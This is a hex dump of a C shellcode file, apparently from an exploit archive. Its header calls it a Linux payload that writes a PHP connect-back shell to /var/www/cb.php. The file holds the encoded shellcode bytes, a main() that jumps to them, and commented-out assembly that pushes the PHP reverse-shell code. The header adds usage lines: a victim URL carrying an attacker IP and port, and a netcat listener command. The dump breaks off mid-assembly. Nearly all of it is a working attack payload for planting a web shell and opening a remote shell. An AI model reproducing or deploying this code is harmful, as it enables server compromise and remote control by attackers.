00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 6c 69 62  |#include <stdlib|
00000010  2e 68 3e 0d 0a 0d 0a 20  20 20 20 20 20 20 20 2f  |.h>....        /|
00000020  2a 20 47 72 61 79 73 63  61 6c 65 20 52 65 73 65  |* Grayscale Rese|
00000030  61 72 63 68 3a 20 4c 69  6e 75 78 20 57 72 69 74  |arch: Linux Writ|
00000040  65 20 46 53 20 50 48 50  20 43 6f 6e 6e 65 63 74  |e FS PHP Connect|
00000050  20 42 61 63 6b 20 55 74  69 6c 69 74 79 20 53 68  | Back Utility Sh|
00000060  65 6c 6c 63 6f 64 65 0d  0a 20 20 20 20 20 20 20  |ellcode..       |
00000070  20 20 2a 0d 0a 20 20 20  20 20 20 20 20 20 2a 20  |  *..         * |
00000080  20 20 20 20 20 46 75 6e  63 74 69 6f 6e 3a 0d 0a  |     Function:..|
00000090  20 20 20 20 20 20 20 20  20 2a 20 20 20 20 20 20  |         *      |
000000a0  20 20 20 20 20 20 20 20  4f 70 65 6e 73 20 2f 76  |        Opens /v|
000000b0  61 72 2f 77 77 77 2f 63  62 2e 70 68 70 20 61 6e  |ar/www/cb.php an|
000000c0  64 20 77 72 69 74 65 73  20 61 20 70 68 70 20 63  |d writes a php c|
000000d0  6f 6e 6e 65 63 74 62 61  63 6b 20 73 68 65 6c 6c  |onnectback shell|
000000e0  20 74 6f 20 74 68 65 20  66 69 6c 65 73 79 73 74  | to the filesyst|
000000f0  65 6d 2e 0d 0a 20 20 20  20 20 20 20 20 20 2a 0d  |em...         *.|
00000100  0a 20 20 20 20 20 20 20  20 20 2a 20 20 20 20 20  |.         *     |
00000110  20 53 68 65 6c 6c 63 6f  64 65 20 53 69 7a 65 3a  | Shellcode Size:|
00000120  20 35 30 38 20 62 79 74  65 73 20 28 4e 6f 20 45  | 508 bytes (No E|
00000130  6e 63 6f 64 69 6e 67 73  29 0d 0a 20 20 20 20 20  |ncodings)..     |
00000140  20 20 20 20 2a 0d 0a 20  20 20 20 20 20 20 20 20  |    *..         |
00000150  2a 20 20 20 20 20 20 50  48 50 20 53 68 65 6c 6c  |*      PHP Shell|
00000160  20 55 73 61 67 65 3a 0d  0a 20 20 20 20 20 20 20  | Usage:..       |
00000170  20 20 2a 20 20 20 20 20  20 20 20 20 20 20 20 20  |  *             |
00000180  20 2f 2f 20 76 69 63 74  69 6d 0d 0a 20 20 20 20  | // victim..    |
00000190  20 20 20 20 20 2a 20 20  20 20 20 20 20 20 20 20  |     *          |
000001a0  20 20 20 20 68 74 74 70  3a 2f 2f 76 75 6c 6e 68  |    http://vulnh|
000001b0  6f 73 74 2e 63 6f 6d 2f  63 62 2e 70 68 70 3f 68  |ost.com/cb.php?h|
000001c0  6f 73 74 3d 31 39 32 2e  31 36 38 2e 31 2e 31 3f  |ost=192.168.1.1?|
000001d0  70 6f 72 74 3d 37 37 37  0d 0a 20 20 20 20 20 20  |port=777..      |
000001e0  20 20 20 2a 0d 0a 20 20  20 20 20 20 20 20 20 2a  |   *..         *|
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000200  20 61 74 74 61 63 6b 65  72 0d 0a 20 20 20 20 20  | attacker..     |
00000210  20 20 20 20 2a 20 20 20  20 20 20 20 20 20 20 20  |    *           |
00000220  20 20 20 6e 63 20 2d 6c  20 2d 70 20 37 37 37 0d  |   nc -l -p 777.|
00000230  0a 20 20 20 20 20 20 20  20 20 2a 0d 0a 20 20 20  |.         *..   |
00000240  20 20 20 20 20 20 2a 20  20 20 20 20 20 67 72 65  |      *      gre|
00000250  65 74 73 3a 20 23 63 2d  2c 20 23 68 68 70 2c 20  |ets: #c-, #hhp, |
00000260  23 6f 6c 64 73 6b 65 77  6c 2c 20 64 2d 74 6f 77  |#oldskewl, d-tow|
00000270  6e 2c 20 73 64 32 36 30  30 2c 20 64 63 32 31 34  |n, sd2600, dc214|
00000280  2c 20 65 76 65 72 79 6f  6e 65 20 65 6c 73 65 2e  |, everyone else.|
00000290  0d 0a 09 20 2a 20 20 20  20 20 20 0d 0a 09 20 2a  |... *      ... *|
000002a0  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
000002b0  20 2a 20 20 20 20 20 20  7e 72 6f 6f 6e 72 0d 0a  | *      ~roonr..|
000002c0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 0d 0a 0d  |         */.....|
000002d0  0a 09 2f 2f 20 73 68 65  6c 6c 63 6f 64 65 0d 0a  |..// shellcode..|
000002e0  20 09 20 20 20 20 63 68  61 72 20 73 63 5b 5d 20  | .    char sc[] |
000002f0  3d 20 22 5c 78 36 38 5c  78 37 30 5c 78 36 38 5c  |= "\x68\x70\x68\|
00000300  78 37 30 5c 78 66 66 5c  78 36 38 5c 78 32 66 5c  |x70\xff\x68\x2f\|
00000310  78 36 33 5c 78 36 32 5c  78 32 65 5c 78 36 38 5c  |x63\x62\x2e\x68\|
00000320  78 32 66 5c 78 37 37 5c  78 37 37 5c 78 37 37 5c  |x2f\x77\x77\x77\|
00000330  78 36 38 22 0d 0a 09 09  09 20 22 5c 78 32 66 5c  |x68"..... "\x2f\|
00000340  78 37 36 5c 78 36 31 5c  78 37 32 5c 78 33 31 5c  |x76\x61\x72\x31\|
00000350  78 63 30 5c 78 38 39 5c  78 65 36 5c 78 38 38 5c  |xc0\x89\xe6\x88\|
00000360  78 34 36 5c 78 30 66 5c  78 38 39 5c 78 65 33 5c  |x46\x0f\x89\xe3\|
00000370  78 33 31 5c 78 63 39 5c  78 62 31 22 0d 0a 09 09  |x31\xc9\xb1"....|
00000380  09 20 22 5c 78 34 32 5c  78 33 31 5c 78 64 32 5c  |. "\x42\x31\xd2\|
00000390  78 62 32 5c 78 66 66 5c  78 33 31 5c 78 63 30 5c  |xb2\xff\x31\xc0\|
000003a0  78 62 30 5c 78 30 35 5c  78 63 64 5c 78 38 30 5c  |xb0\x05\xcd\x80\|
000003b0  78 33 31 5c 78 64 62 5c  78 38 38 5c 78 63 33 5c  |x31\xdb\x88\xc3\|
000003c0  78 36 38 22 0d 0a 09 09  09 20 22 5c 78 33 66 5c  |x68"..... "\x3f\|
000003d0  78 33 65 5c 78 66 66 5c  78 66 66 5c 78 36 38 5c  |x3e\xff\xff\x68\|
000003e0  78 33 62 5c 78 37 64 5c  78 32 30 5c 78 37 64 5c  |x3b\x7d\x20\x7d\|
000003f0  78 36 38 5c 78 32 34 5c  78 37 32 5c 78 32 39 5c  |x68\x24\x72\x29\|
00000400  78 32 39 5c 78 36 38 5c  78 36 63 22 0d 0a 09 09  |x29\x68\x6c"....|
00000410  09 20 22 5c 78 36 35 5c  78 36 65 5c 78 32 38 5c  |. "\x65\x6e\x28\|
00000420  78 36 38 5c 78 32 30 5c  78 37 33 5c 78 37 34 5c  |x68\x20\x73\x74\|
00000430  78 37 32 5c 78 36 38 5c  78 32 30 5c 78 32 34 5c  |x72\x68\x20\x24\|
00000440  78 37 32 5c 78 32 63 5c  78 36 38 5c 78 36 66 5c  |x72\x2c\x68\x6f\|
00000450  78 36 33 22 0d 0a 09 09  09 20 22 5c 78 36 62 5c  |x63"..... "\x6b\|
00000460  78 32 63 5c 78 36 38 5c  78 36 35 5c 78 32 38 5c  |x2c\x68\x65\x28\|
00000470  78 32 34 5c 78 37 33 5c  78 36 38 5c 78 37 37 5c  |x24\x73\x68\x77\|
00000480  78 37 32 5c 78 36 39 5c  78 37 34 5c 78 36 38 5c  |x72\x69\x74\x68\|
00000490  78 36 62 5c 78 36 35 5c  78 37 34 22 0d 0a 09 09  |x6b\x65\x74"....|
000004a0  09 20 22 5c 78 35 66 5c  78 36 38 5c 78 33 62 5c  |. "\x5f\x68\x3b\|
000004b0  78 37 33 5c 78 36 66 5c  78 36 33 5c 78 36 38 5c  |x73\x6f\x63\x68\|
000004c0  78 33 31 5c 78 32 34 5c  78 32 30 5c 78 32 32 5c  |x31\x24\x20\x22\|
000004d0  78 36 38 5c 78 37 33 5c  78 37 35 5c 78 33 31 5c  |x68\x73\x75\x31\|
000004e0  78 32 65 22 0d 0a 09 09  09 20 22 5c 78 36 38 5c  |x2e"..... "\x68\|
000004f0  78 35 63 5c 78 36 65 5c  78 36 33 5c 78 36 32 5c  |x5c\x6e\x63\x62\|
00000500  78 36 38 5c 78 32 65 5c  78 33 64 5c 78 32 30 5c  |x68\x2e\x3d\x20\|
00000510  78 32 32 5c 78 36 38 5c  78 36 30 5c 78 33 62 5c  |x22\x68\x60\x3b\|
00000520  78 32 34 5c 78 37 32 5c  78 36 38 22 0d 0a 09 09  |x24\x72\x68"....|
00000530  09 20 22 5c 78 32 30 5c  78 36 30 5c 78 32 34 5c  |. "\x20\x60\x24\|
00000540  78 36 39 5c 78 36 38 5c  78 32 34 5c 78 37 32 5c  |x69\x68\x24\x72\|
00000550  78 32 30 5c 78 33 64 5c  78 36 38 5c 78 33 30 5c  |x20\x3d\x68\x30\|
00000560  78 32 39 5c 78 32 39 5c  78 37 62 5c 78 36 38 5c  |x29\x29\x7b\x68\|
00000570  78 32 63 22 0d 0a 09 09  09 20 22 5c 78 32 30 5c  |x2c"..... "\x20\|
00000580  78 33 31 5c 78 33 30 5c  78 36 38 5c 78 37 33 5c  |x31\x30\x68\x73\|
00000590  78 36 66 5c 78 36 33 5c  78 36 62 5c 78 36 38 5c  |x6f\x63\x6b\x68\|
000005a0  78 36 31 5c 78 36 34 5c  78 32 38 5c 78 32 34 5c  |x61\x64\x28\x24\|
000005b0  78 36 38 5c 78 37 34 5c  78 35 66 22 0d 0a 09 09  |x68\x74\x5f"....|
000005c0  09 20 22 5c 78 37 32 5c  78 36 35 5c 78 36 38 5c  |. "\x72\x65\x68\|
000005d0  78 36 66 5c 78 36 33 5c  78 36 62 5c 78 36 35 5c  |x6f\x63\x6b\x65\|
000005e0  78 36 38 5c 78 32 34 5c  78 36 39 5c 78 33 64 5c  |x68\x24\x69\x3d\|
000005f0  78 37 33 5c 78 36 38 5c  78 36 39 5c 78 36 63 5c  |x73\x68\x69\x6c\|
00000600  78 36 35 22 0d 0a 09 09  09 20 22 5c 78 32 38 5c  |x65"..... "\x28\|
00000610  78 36 38 5c 78 32 39 5c  78 33 62 5c 78 37 37 5c  |x68\x29\x3b\x77\|
00000620  78 36 38 5c 78 36 38 5c  78 32 32 5c 78 32 63 5c  |x68\x68\x22\x2c\|
00000630  78 33 31 5c 78 33 30 5c  78 36 38 5c 78 37 34 5c  |x31\x30\x68\x74\|
00000640  78 36 35 5c 78 36 34 5c  78 33 61 22 0d 0a 09 09  |x65\x64\x3a"....|
00000650  09 20 22 5c 78 36 38 5c  78 36 65 5c 78 36 65 5c  |. "\x68\x6e\x6e\|
00000660  78 36 35 5c 78 36 33 5c  78 36 38 5c 78 32 30 5c  |x65\x63\x68\x20\|
00000670  78 32 32 5c 78 34 33 5c  78 36 66 5c 78 36 38 5c  |x22\x43\x6f\x68\|
00000680  78 36 66 5c 78 36 33 5c  78 36 62 5c 78 32 63 5c  |x6f\x63\x6b\x2c\|
00000690  78 36 38 22 0d 0a 09 09  09 20 22 5c 78 36 35 5c  |x68"..... "\x65\|
000006a0  78 32 38 5c 78 32 34 5c  78 37 33 5c 78 36 38 5c  |x28\x24\x73\x68\|
000006b0  78 37 37 5c 78 37 32 5c  78 36 39 5c 78 37 34 5c  |x77\x72\x69\x74\|
000006c0  78 36 38 5c 78 36 62 5c  78 36 35 5c 78 37 34 5c  |x68\x6b\x65\x74\|
000006d0  78 35 66 5c 78 36 38 5c  78 33 62 22 0d 0a 09 09  |x5f\x68\x3b"....|
000006e0  09 20 22 5c 78 37 33 5c  78 36 66 5c 78 36 33 5c  |. "\x73\x6f\x63\|
000006f0  78 36 38 5c 78 36 66 5c  78 37 32 5c 78 37 34 5c  |x68\x6f\x72\x74\|
00000700  78 32 39 5c 78 36 38 5c  78 32 63 5c 78 32 30 5c  |x29\x68\x2c\x20\|
00000710  78 32 34 5c 78 37 30 5c  78 36 38 5c 78 37 32 5c  |x24\x70\x68\x72\|
00000720  78 36 35 22 0d 0a 09 09  09 20 22 5c 78 37 33 5c  |x65"..... "\x73\|
00000730  78 37 33 5c 78 36 38 5c  78 32 34 5c 78 36 31 5c  |x73\x68\x24\x61\|
00000740  78 36 34 5c 78 36 34 5c  78 36 38 5c 78 36 33 5c  |x64\x64\x68\x63\|
00000750  78 36 62 5c 78 32 63 5c  78 32 30 5c 78 36 38 5c  |x6b\x2c\x20\x68\|
00000760  78 32 38 5c 78 32 34 5c  78 37 33 22 0d 0a 09 09  |x28\x24\x73"....|
00000770  09 20 22 5c 78 36 66 5c  78 36 38 5c 78 36 65 5c  |. "\x6f\x68\x6e\|
00000780  78 36 35 5c 78 36 33 5c  78 37 34 5c 78 36 38 5c  |x65\x63\x74\x68\|
00000790  78 35 66 5c 78 36 33 5c  78 36 66 5c 78 36 65 5c  |x5f\x63\x6f\x6e\|
000007a0  78 36 38 5c 78 36 33 5c  78 36 62 5c 78 36 35 5c  |x68\x63\x6b\x65\|
000007b0  78 37 34 22 0d 0a 09 09  09 20 22 5c 78 36 38 5c  |x74"..... "\x68\|
000007c0  78 32 39 5c 78 33 62 5c  78 37 33 5c 78 36 66 5c  |x29\x3b\x73\x6f\|
000007d0  78 36 38 5c 78 35 66 5c  78 35 34 5c 78 34 33 5c  |x68\x5f\x54\x43\|
000007e0  78 35 30 5c 78 36 38 5c  78 32 63 5c 78 35 33 5c  |x50\x68\x2c\x53\|
000007f0  78 34 66 5c 78 34 63 5c  78 36 38 22 0d 0a 09 09  |x4f\x4c\x68"....|
00000800  09 20 22 5c 78 35 32 5c  78 34 35 5c 78 34 31 5c  |. "\x52\x45\x41\|
00000810  78 34 64 5c 78 36 38 5c  78 34 62 5c 78 35 66 5c  |x4d\x68\x4b\x5f\|
00000820  78 35 33 5c 78 35 34 5c  78 36 38 5c 78 32 63 5c  |x53\x54\x68\x2c\|
00000830  78 35 33 5c 78 34 66 5c  78 34 33 5c 78 36 38 5c  |x53\x4f\x43\x68\|
00000840  78 34 39 22 0d 0a 09 09  09 20 22 5c 78 34 65 5c  |x49"..... "\x4e\|
00000850  78 34 35 5c 78 35 34 5c  78 36 38 5c 78 32 38 5c  |x45\x54\x68\x28\|
00000860  78 34 31 5c 78 34 36 5c  78 35 66 5c 78 36 38 5c  |x41\x46\x5f\x68\|
00000870  78 36 35 5c 78 36 31 5c  78 37 34 5c 78 36 35 5c  |x65\x61\x74\x65\|
00000880  78 36 38 5c 78 37 34 5c  78 35 66 22 0d 0a 09 09  |x68\x74\x5f"....|
00000890  09 20 22 5c 78 36 33 5c  78 37 32 5c 78 36 38 5c  |. "\x63\x72\x68\|
000008a0  78 36 66 5c 78 36 33 5c  78 36 62 5c 78 36 35 5c  |x6f\x63\x6b\x65\|
000008b0  78 36 38 5c 78 36 33 5c  78 36 62 5c 78 33 64 5c  |x68\x63\x6b\x3d\|
000008c0  78 37 33 5c 78 36 38 5c  78 33 62 5c 78 32 34 5c  |x73\x68\x3b\x24\|
000008d0  78 37 33 22 0d 0a 09 09  09 20 22 5c 78 36 66 5c  |x73"..... "\x6f\|
000008e0  78 36 38 5c 78 37 32 5c  78 37 34 5c 78 32 37 5c  |x68\x72\x74\x27\|
000008f0  78 35 64 5c 78 36 38 5c  78 35 62 5c 78 32 37 5c  |x5d\x68\x5b\x27\|
00000900  78 37 30 5c 78 36 66 5c  78 36 38 5c 78 35 66 5c  |x70\x6f\x68\x5f\|
00000910  78 34 37 5c 78 34 35 5c  78 35 34 22 0d 0a 09 09  |x47\x45\x54"....|
00000920  09 20 22 5c 78 36 38 5c  78 37 32 5c 78 37 34 5c  |. "\x68\x72\x74\|
00000930  78 33 64 5c 78 32 34 5c  78 36 38 5c 78 33 62 5c  |x3d\x24\x68\x3b\|
00000940  78 32 34 5c 78 37 30 5c  78 36 66 5c 78 36 38 5c  |x24\x70\x6f\x68\|
00000950  78 37 34 5c 78 32 37 5c  78 35 64 5c 78 32 39 5c  |x74\x27\x5d\x29\|
00000960  78 36 38 22 0d 0a 09 09  09 20 22 5c 78 32 37 5c  |x68"..... "\x27\|
00000970  78 36 38 5c 78 36 66 5c  78 37 33 5c 78 36 38 5c  |x68\x6f\x73\x68\|
00000980  78 34 37 5c 78 34 35 5c  78 35 34 5c 78 35 62 5c  |x47\x45\x54\x5b\|
00000990  78 36 38 5c 78 36 35 5c  78 32 38 5c 78 32 34 5c  |x68\x65\x28\x24\|
000009a0  78 35 66 5c 78 36 38 5c  78 37 39 22 0d 0a 09 09  |x5f\x68\x79"....|
000009b0  09 20 22 5c 78 36 65 5c  78 36 31 5c 78 36 64 5c  |. "\x6e\x61\x6d\|
000009c0  78 36 38 5c 78 36 66 5c  78 37 33 5c 78 37 34 5c  |x68\x6f\x73\x74\|
000009d0  78 36 32 5c 78 36 38 5c  78 36 37 5c 78 36 35 5c  |x62\x68\x67\x65\|
000009e0  78 37 34 5c 78 36 38 5c  78 36 38 5c 78 36 35 5c  |x74\x68\x68\x65\|
000009f0  78 37 33 22 0d 0a 09 09  09 20 22 5c 78 37 33 5c  |x73"..... "\x73\|
00000a00  78 33 64 5c 78 36 38 5c  78 36 31 5c 78 36 34 5c  |x3d\x68\x61\x64\|
00000a10  78 36 34 5c 78 37 32 5c  78 36 38 5c 78 37 33 5c  |x64\x72\x68\x73\|
00000a20  78 36 35 5c 78 37 62 5c  78 32 34 5c 78 36 38 5c  |x65\x7b\x24\x68\|
00000a30  78 33 62 5c 78 37 64 5c  78 36 35 22 0d 0a 09 09  |x3b\x7d\x65"....|
00000a40  09 20 22 5c 78 36 63 5c  78 36 38 5c 78 33 34 5c  |. "\x6c\x68\x34\|
00000a50  78 32 65 5c 78 32 32 5c  78 32 39 5c 78 36 38 5c  |x2e\x22\x29\x68\|
00000a60  78 37 32 5c 78 32 30 5c  78 33 34 5c 78 33 30 5c  |x72\x20\x34\x30\|
00000a70  78 36 38 5c 78 34 35 5c  78 37 32 5c 78 37 32 5c  |x68\x45\x72\x72\|
00000a80  78 36 66 22 0d 0a 09 09  09 20 22 5c 78 36 38 5c  |x6f"..... "\x68\|
00000a90  78 36 65 5c 78 37 34 5c  78 32 38 5c 78 32 32 5c  |x6e\x74\x28\x22\|
00000aa0  78 36 38 5c 78 37 62 5c  78 37 30 5c 78 37 32 5c  |x68\x7b\x70\x72\|
00000ab0  78 36 39 5c 78 36 38 5c  78 37 34 5c 78 32 37 5c  |x69\x68\x74\x27\|
00000ac0  78 35 64 5c 78 32 39 5c  78 36 38 22 0d 0a 09 09  |x5d\x29\x68"....|
00000ad0  09 20 22 5c 78 32 37 5c  78 37 30 5c 78 36 66 5c  |. "\x27\x70\x6f\|
00000ae0  78 37 32 5c 78 36 38 5c  78 34 37 5c 78 34 35 5c  |x72\x68\x47\x45\|
00000af0  78 35 34 5c 78 35 62 5c  78 36 38 5c 78 32 36 5c  |x54\x5b\x68\x26\|
00000b00  78 32 31 5c 78 32 34 5c  78 35 66 5c 78 36 38 5c  |x21\x24\x5f\x68\|
00000b10  78 37 34 22 0d 0a 09 09  09 20 22 5c 78 32 37 5c  |x74"..... "\x27\|
00000b20  78 35 64 5c 78 32 36 5c  78 36 38 5c 78 32 37 5c  |x5d\x26\x68\x27\|
00000b30  78 36 38 5c 78 36 66 5c  78 37 33 5c 78 36 38 5c  |x68\x6f\x73\x68\|
00000b40  78 34 37 5c 78 34 35 5c  78 35 34 5c 78 35 62 5c  |x47\x45\x54\x5b\|
00000b50  78 36 38 5c 78 32 38 5c  78 32 31 22 0d 0a 09 09  |x68\x28\x21"....|
00000b60  09 20 22 5c 78 32 34 5c  78 35 66 5c 78 36 38 5c  |. "\x24\x5f\x68\|
00000b70  78 35 30 5c 78 32 30 5c  78 36 39 5c 78 36 36 5c  |x50\x20\x69\x66\|
00000b80  78 36 38 5c 78 33 63 5c  78 33 66 5c 78 35 30 5c  |x68\x3c\x3f\x50\|
00000b90  78 34 38 5c 78 33 31 5c  78 63 30 5c 78 38 39 5c  |x48\x31\xc0\x89\|
00000ba0  78 65 36 22 0d 0a 09 09  09 20 22 5c 78 62 30 5c  |xe6"..... "\xb0\|
00000bb0  78 30 34 5c 78 38 39 5c  78 65 31 5c 78 36 36 5c  |x04\x89\xe1\x66\|
00000bc0  78 62 61 5c 78 36 32 5c  78 30 31 5c 78 63 64 5c  |xba\x62\x01\xcd\|
00000bd0  78 38 30 22 3b 0d 0a 0d  0a 09 0d 0a 69 6e 74 20  |x80";.......int |
00000be0  6d 61 69 6e 28 29 7b 0d  0a 09 0d 0a 0d 0a 09 2f  |main(){......../|
00000bf0  2f 20 72 75 6e 20 73 68  65 6c 6c 63 6f 64 65 0d  |/ run shellcode.|
00000c00  0a 20 20 20 20 20 20 20  20 61 73 6d 28 22 4a 4d  |.        asm("JM|
00000c10  50 20 25 30 3b 22 20 3a  20 22 3d 6d 22 20 28 73  |P %0;" : "=m" (s|
00000c20  63 29 29 3b 0d 0a 0d 0a  09 2f 2a 0d 0a 09 09 61  |c));...../*....a|
00000c30  73 6d 20 76 6f 6c 61 74  69 6c 65 28 0d 0a 09 09  |sm volatile(....|
00000c40  20 20 20 20 22 63 62 5f  73 68 65 6c 6c 63 6f 64  |    "cb_shellcod|
00000c50  65 3a 5c 6e 22 0d 0a 09  09 20 20 20 20 22 70 75  |e:\n"....    "pu|
00000c60  73 68 20 24 30 78 66 66  37 30 36 38 37 30 3b 22  |sh $0xff706870;"|
00000c70  20 0d 0a 09 09 20 20 20  20 22 70 75 73 68 20 24  | ....    "push $|
00000c80  30 78 32 65 36 32 36 33  32 66 3b 22 20 0d 0a 09  |0x2e62632f;" ...|
00000c90  09 20 20 20 20 22 70 75  73 68 20 24 30 78 37 37  |.    "push $0x77|
00000ca0  37 37 37 37 32 66 3b 22  20 0d 0a 09 09 20 20 20  |77772f;" ....   |
00000cb0  20 22 70 75 73 68 20 24  30 78 37 32 36 31 37 36  | "push $0x726176|
00000cc0  32 66 3b 22 0d 0a 09 09  20 20 20 20 22 78 6f 72  |2f;"....    "xor|
00000cd0  20 25 65 61 78 2c 20 25  65 61 78 3b 22 20 0d 0a  | %eax, %eax;" ..|
00000ce0  09 09 20 20 20 20 22 6d  6f 76 20 25 65 73 70 2c  |..    "mov %esp,|
00000cf0  20 25 65 73 69 3b 22 0d  0a 09 09 20 20 20 20 22  | %esi;"....    "|
00000d00  6d 6f 76 62 20 25 61 6c  2c 20 30 78 66 28 25 65  |movb %al, 0xf(%e|
00000d10  73 69 29 3b 22 0d 0a 09  09 20 20 20 0d 0a 09 09  |si);"....   ....|
00000d20  20 20 20 20 2f 2f 20 73  79 73 5f 6f 70 65 6e 20  |    // sys_open |
00000d30  0d 0a 09 09 20 20 20 20  22 6d 6f 76 20 25 65 73  |....    "mov %es|
00000d40  70 2c 20 25 65 62 78 3b  20 22 0d 0a 20 20 20 20  |p, %ebx; "..    |
00000d50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d60  22 78 6f 72 20 25 65 63  78 2c 20 25 65 63 78 3b  |"xor %ecx, %ecx;|
00000d70  22 0d 0a 09 09 09 20 20  20 20 22 6d 6f 76 62 20  |".....    "movb |
00000d80  24 30 78 34 32 2c 20 25  63 6c 3b 22 0d 0a 09 09  |$0x42, %cl;"....|
00000d90  20 20 20 20 09 22 78 6f  72 20 25 65 64 78 2c 20  |    ."xor %edx, |
00000da0  25 65 64 78 3b 22 0d 0a  09 09 09 20 20 20 20 22  |%edx;".....    "|
00000db0  6d 6f 76 62 20 24 30 78  66 66 2c 20 25 64 6c 3b  |movb $0xff, %dl;|
00000dc0  22 0d 0a 09 09 20 20 20  20 09 22 78 6f 72 20 25  |"....    ."xor %|
00000dd0  65 61 78 2c 20 25 65 61  78 3b 22 0d 0a 09 20 09  |eax, %eax;"... .|
00000de0  09 20 20 20 20 22 6d 6f  76 62 20 24 30 78 30 35  |.    "movb $0x05|
00000df0  2c 20 25 61 6c 3b 22 20  0d 0a 09 09 20 20 20 20  |, %al;" ....    |
00000e00  22 69 6e 74 20 24 30 78  38 30 3b 22 0d 0a 09 09  |"int $0x80;"....|
00000e10  20 20 20 20 0d 0a 09 09  20 20 20 20 2f 2f 20 73  |    ....    // s|
00000e20  79 73 5f 77 72 69 74 65  0d 0a 09 09 20 20 20 20  |ys_write....    |
00000e30  22 78 6f 72 20 25 65 62  78 2c 20 25 65 62 78 3b  |"xor %ebx, %ebx;|
00000e40  22 0d 0a 09 09 20 20 20  20 22 6d 6f 76 20 25 61  |"....    "mov %a|
00000e50  6c 2c 20 25 62 6c 3b 22  0d 0a 09 09 20 20 20 20  |l, %bl;"....    |
00000e60  0d 0a 09 09 09 2f 2f 20  70 68 70 20 63 6f 6e 6e  |.....// php conn|
00000e70  65 63 74 62 61 63 6b 20  73 68 65 6c 6c 63 6f 64  |ectback shellcod|
00000e80  65 0d 0a 09 09 09 22 70  75 73 68 20 24 30 78 66  |e....."push $0xf|
00000e90  66 66 66 33 65 33 66 3b  20 70 75 73 68 20 24 30  |fff3e3f; push $0|
00000ea0  78 37 64 32 30 37 64 33  62 3b 20 70 75 73 68 20  |x7d207d3b; push |
00000eb0  24 30 78 32 39 32 39 37  32 32 34 3b 20 70 75 73  |$0x29297224; pus|
00000ec0  68 20 24 30 78 32 38 36  65 36 35 36 63 3b 22 0d  |h $0x286e656c;".|
00000ed0  0a 09 09 09 22 70 75 73  68 20 24 30 78 37 32 37  |...."push $0x727|
00000ee0  34 37 33 32 30 3b 20 70  75 73 68 20 24 30 78 32  |47320; push $0x2|
00000ef0  63 37 32 32 34 32 30 3b  20 70 75 73 68 20 24 30  |c722420; push $0|
00000f00  78 32 63 36 62 36 33 36  66 3b 20 70 75 73 68 20  |x2c6b636f; push |
00000f10  24 30 78 37 33 32 34 32  38 36 35 3b 22 0d 0a 09  |$0x73242865;"...|
00000f20  09 09 22 70 75 73 68 20  24 30 78 37 34 36 39 37  |.."push $0x74697|
00000f30  32 37 37 3b 20 70 75 73  68 20 24 30 78 35 66 37  |277; push $0x5f7|
00000f40  34 36 35 36 62 3b 20 70  75 73 68 20 24 30 78 36  |4656b; push $0x6|
00000f50  33 36 66 37 33 33 62 3b  20 70 75 73 68 20 24 30  |36f733b; push $0|
00000f60  78 32 32 32 30 32 34 33  31 3b 22 0d 0a 09 09 09  |x22202431;".....|
00000f70  22 70 75 73 68 20 24 30  78 32 65 33 31 37 35 37  |"push $0x2e31757|
00000f80  33 3b 20 70 75 73 68 20  24 30 78 36 32 36 33 36  |3; push $0x62636|
00000f90  65 35 63 3b 20 70 75 73  68 20 24 30 78 32 32 32  |e5c; push $0x222|
00000fa0  30 33 64 32 65 3b 20 70  75 73 68 20 24 30 78 37  |03d2e; push $0x7|
00000fb0  32 32 34 33 62 36 30 3b  22 0d 0a 09 09 09 22 70  |2243b60;"....."p|
00000fc0  75 73 68 20 24 30 78 36  39 32 34 36 30 32 30 3b  |ush $0x69246020;|
00000fd0  20 70 75 73 68 20 24 30  78 33 64 32 30 37 32 32  | push $0x3d20722|
00000fe0  34 3b 20 70 75 73 68 20  24 30 78 37 62 32 39 32  |4; push $0x7b292|
00000ff0  39 33 30 3b 20 70 75 73  68 20 24 30 78 33 30 33  |930; push $0x303|
00001000  31 32 30 32 63 3b 22 0d  0a 09 09 09 22 70 75 73  |1202c;"....."pus|
00001010  68 20 24 30 78 36 62 36  33 36 66 37 33 3b 20 70  |h $0x6b636f73; p|
00001020  75 73 68 20 24 30 78 32  34 32 38 36 34 36 31 3b  |ush $0x24286461;|
00001030  20 70 75 73 68 20 24 30  78 36 35 37 32 35 66 37  | push $0x65725f7|
00001040  34 3b 20 70 75 73 68 20  24 30 78 36 35 36 62 36  |4; push $0x656b6|
00001050  33 36 66 3b 22 0d 0a 09  09 09 22 70 75 73 68 20  |36f;"....."push |
00001060  24 30 78 37 33 33 64 36  39 32 34 3b 20 70 75 73  |$0x733d6924; pus|
00001070  68 20 24 30 78 32 38 36  35 36 63 36 39 3b 20 70  |h $0x28656c69; p|
00001080  75 73 68 20 24 30 78 36  38 37 37 33 62 32 39 3b  |ush $0x68773b29;|
00001090  20 70 75 73 68 20 24 30  78 33 30 33 31 32 63 32  | push $0x30312c2|
000010a0  32 3b 22 0d 0a 09 09 09  22 70 75 73 68 20 24 30  |2;"....."push $0|
000010b0  78 33 61 36 34 36 35 37  34 3b 20 70 75 73 68 20  |x3a646574; push |
000010c0  24 30 78 36 33 36 35 36  65 36 65 3b 20 70 75 73  |$0x63656e6e; pus|
000010d0  68 20 24 30 78 36 66 34  33 32 32 32 30 3b 20 70  |h $0x6f432220; p|
000010e0  75 73 68 20 24 30 78 32  63 36 62 36 33 36 66 3b  |ush $0x2c6b636f;|
000010f0  22 0d 0a 09 09 09 22 70  75 73 68 20 24 30 78 37  |"....."push $0x7|
00001100  33 32 34 32 38 36 35 3b  20 70 75 73 68 20 24 30  |3242865; push $0|
00001110  78 37 34 36 39 37 32 37  37 3b 20 70 75 73 68 20  |x74697277; push |
00001120  24 30 78 35 66 37 34 36  35 36 62 3b 20 70 75 73  |$0x5f74656b; pus|
00001130  68 20 24 30 78 36 33 36  66 37 33 33 62 3b 22 0d  |h $0x636f733b;".|
00001140  0a 09 09 09 22 70 75 73  68 20 24 30 78 32 39 37  |...."push $0x297|
00001150  34 37 32 36 66 3b 20 70  75 73 68 20 24 30 78 37  |4726f; push $0x7|
00001160  30 32 34 32 30 32 63 3b  20 70 75 73 68 20 24 30  |024202c; push $0|
00001170  78 37 33 37 33 36 35 37  32 3b 20 70 75 73 68 20  |x73736572; push |
00001180  24 30 78 36 34 36 34 36  31 32 34 3b 22 0d 0a 09  |$0x64646124;"...|
